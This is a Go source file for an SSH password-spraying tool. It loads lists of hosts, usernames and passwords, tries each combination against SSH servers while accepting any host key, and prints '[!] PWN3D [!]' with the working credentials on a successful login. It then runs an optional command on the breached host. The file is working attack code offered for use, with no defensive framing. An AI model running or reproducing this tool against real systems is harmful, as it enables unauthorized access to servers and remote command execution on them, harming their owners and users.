package spray

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

type SprayModule struct {
	Hosts     string
	Users     string
	Passwords string
}

type ModuleBuilder struct {
	Module
	Hosts     map[int]string
	Users     map[int]string
	Passwords map[int]string
}

type Module interface {
	GetTaskData() ModuleBuilder
}

// This parses the data from the command line arguments and returns back the targets and configurations for the task then starts the task

func InitSshTask(task SprayModule, delay time.Duration, cmd string, port int) {
	newTask := task.Initialize()
	newTask.RunTask(delay, cmd, port)
}

// SSH protocol will call this
func (x SprayModule) Initialize() ModuleBuilder {

	var _builder = ModuleBuilder{
		Hosts: map[int]string{
			0: x.Hosts,
		},
		Users: map[int]string{
			0: x.Users,
		},
		Passwords: map[int]string{
			0: x.Passwords,
		},
	}

	build := BuildTask(_builder)

	fmt.Printf("\n\n[***] TARGETS [***] \nHosts: %+v \nUsers: %+v \nPasswords: %+v \n", build.hostsList(), build.usersList(), build.passwordsList())

	return build
}

func BuildTask(m Module) ModuleBuilder {
	return m.GetTaskData()
}

func (mb ModuleBuilder) GetTaskData() ModuleBuilder {
	var values = make(map[string]string)

	values["hosts"] = mb.Hosts[0]
	values["users"] = mb.Users[0]
	values["passwords"] = mb.Passwords[0]

	build := configureTask(values)

	return build
}

// Task is run here
func (x ModuleBuilder) RunTask(delay time.Duration, cmd string, port int) {
	fmt.Printf("\n[!] STARTING [!] \n")
	fmt.Printf("%s\n", "-----------------")

	var wg sync.WaitGroup
	wg.Add(1)

	go func() {
		for _, hosts := range x.Hosts {
			_host := hosts
			for _, users := range x.Users {
				_user := users
				for _, passwords := range x.Passwords {
					_pw := passwords
					// We sleep for 5 seconds every 5 requests to prevent excessive simultaneous logins
					SshTask(_host, _user, _pw, cmd, port)
					time.Sleep(delay)
				}
			}
			fmt.Printf("\n[!] HOST: %s FINISHED!\n", _host)
		}
		wg.Done()
	}()
	wg.Wait()
	fmt.Printf("\n%s\n", "----------------")
	fmt.Println("[!] FINISHED [!]")
}

// Helper functions
func configureTask(input map[string]string) ModuleBuilder {

	var data = map[string]map[int]string{
		"hosts":     {},
		"users":     {},
		"passwords": {},
	}

	for id, i := range input {
		if strings.Contains(i, "/") {
			var _lines = readTargetFile(i)
			for _out, value := range _lines {
				data[id][_out] = value
			}

		} else if strings.Contains(i, ".") {
			if _, err := os.Stat(i); err == nil {
				var _lines = readTargetFile(i)
				_counter := 0
				for _, value := range _lines {
					data[id][_counter] = value
					_counter++
				}
			} else {
				skip := net.ParseIP(i)
				if skip != nil {
					data[id][0] = i
					continue
				} else {
					data[id][0] = i
				}
			}
		} else {
			data[id][0] = i
		}
	}

	var _build = ModuleBuilder{
		Hosts:     data["hosts"],
		Users:     data["users"],
		Passwords: data["passwords"],
	}

	return _build
}

func readTargetFile(inputFile string) map[int]string {

	var lines = make(map[int]string)

	file, err := os.Open(inputFile)
	if err != nil {
		fmt.Println(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	i := 0
	for scanner.Scan() {
		if scanner.Text() != "" {
			lines[i] = scanner.Text()
			i += 1
		}

	}

	if err := scanner.Err(); err != nil {
		fmt.Println(err)
	}
	return lines
}

func (m ModuleBuilder) usersList() []string {
	var users []string
	for _, value := range m.Users {
		users = append(users, value)
	}
	return users
}

func (m ModuleBuilder) hostsList() []string {
	var hosts []string
	for _, value := range m.Hosts {
		hosts = append(hosts, value)
	}
	return hosts
}

func (m ModuleBuilder) passwordsList() []string {
	var passwords []string
	for _, value := range m.Passwords {
		passwords = append(passwords, value)
	}
	return passwords
}

// Task
func SshTask(host, user, pass, cmd string, sshport int) {
	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: KeyPrint,
	}

	fmt.Printf("\n[+] Connecting as %s with %s to %s:%d\n", user, pass, host, sshport)

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", host, sshport), sshConfig)

	if err != nil {
		fmt.Println("[-] Unable to connect")
		return
	} else {
		fmt.Printf("[!] PWN3D [!] \n %s:%s@%s\n", host, user, pass)
	}

	defer client.Close()

	// start session
	sess, err := client.NewSession()
	if err != nil {
		log.Fatal(err)
	}
	defer sess.Close()

	sess.Stdout = os.Stdout
	sess.Stderr = os.Stderr

	if len(cmd) > 0 {
		err = sess.Run(cmd)
		if err != nil {
			log.Fatal(err)
		}
	}
}

func KeyPrint(dialAddr string, addr net.Addr, key ssh.PublicKey) error {
	fmt.Printf("%s %s %s\n", strings.Split(dialAddr, ":")[0], key.Type(), base64.StdEncoding.EncodeToString(key.Marshal()))
	return nil
}
